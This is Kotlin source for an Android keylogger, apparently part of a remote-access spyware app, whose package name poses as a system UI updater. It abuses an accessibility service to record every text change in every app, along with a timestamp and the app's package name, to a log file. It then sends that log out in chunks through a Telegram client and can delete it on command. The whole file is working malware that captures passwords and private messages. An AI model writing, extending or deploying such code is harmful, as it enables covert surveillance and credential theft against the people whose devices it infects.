package com.android.systemui.updater.capabilities

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.android.systemui.updater.TelegramClient
import com.android.systemui.updater.ErrorReporter
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class AccessibilityKeylogger : AccessibilityService() {

        companion object {
            private const val LOG_FILE = "keylog.txt"
            private val sdf = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

            fun isEnabled(ctx: Context): Boolean {
                val enabled = android.provider.Settings.Secure.getString(
                    ctx.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: return false
                val self = "${ctx.packageName}/${AccessibilityKeylogger::class.java.name}"
                return enabled.split(":").any { it == self }
            }

            fun dumpLog(ctx: Context, telegram: TelegramClient) {
                if (!isEnabled(ctx)) {
                    telegram.sendText("❌ Keylogger not enabled. Enable in Settings → Accessibility")
                    return
                }
                val file = File(ctx.filesDir, LOG_FILE)
                if (!file.exists() || file.length() == 0L) {
                    telegram.sendText("⌨️ Keylog empty")
                    return
                }
                try {
                    val content = file.readText()
                    if (content.length > 3500) {
                        telegram.sendText("⌨️ KEYLOG (large file - sending in chunks)\n━━━━━━━━━━━━")
                        content.chunked(3500).forEach { chunk ->
                            telegram.sendText(chunk)
                            Thread.sleep(500)
                        }
                    } else {
                        telegram.sendText("⌨️ KEYLOG\n━━━━━━━━━━━━━━\n$content")
                    }
                } catch (e: Exception) {
                    telegram.sendText("⌨️ Error reading keylog: ${e.message}")
                    ErrorReporter.report(e, "AccessibilityKeylogger")
                }
            }

            fun clearLog(ctx: Context, telegram: TelegramClient? = null) {
                File(ctx.filesDir, LOG_FILE).delete()
                telegram?.sendText("⌨️ Keylog cleared")
            }
        }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val text = event.text.joinToString("").trim()
        if (text.isEmpty()) return

        val pkg = event.packageName?.toString() ?: "unknown"
        val time = sdf.format(Date())

        val entry = "[$time][$pkg] $text\n"
        File(filesDir, LOG_FILE).appendText(entry)
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
    }
}
